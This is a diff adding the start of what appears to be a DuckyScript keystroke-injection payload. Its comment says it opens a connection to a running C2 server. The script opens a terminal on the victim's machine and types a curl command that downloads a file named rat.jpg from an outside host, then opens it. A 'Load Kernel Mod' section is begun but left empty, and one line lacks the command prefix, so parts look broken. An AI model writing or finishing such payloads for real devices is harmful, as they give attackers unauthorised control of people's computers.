@@ -1,0 +1,17 @@
+REM     Open a connection to running c2 server 
+
+REM     Start terminal
+REM     *******************
+DELAY 1000
+GUI
+DELAY 500
+STRING gnome-terminal
+ENTER
+DELAY 2000
+REM     Run curl and show image
+REM     *******************
+STRINGLN curl -s https://iili.io/njIrQBs.md.jpg -o rat.jpg
+xdg-open rat.jpg
+
+REM Load Kernel Mod
+REM *******************
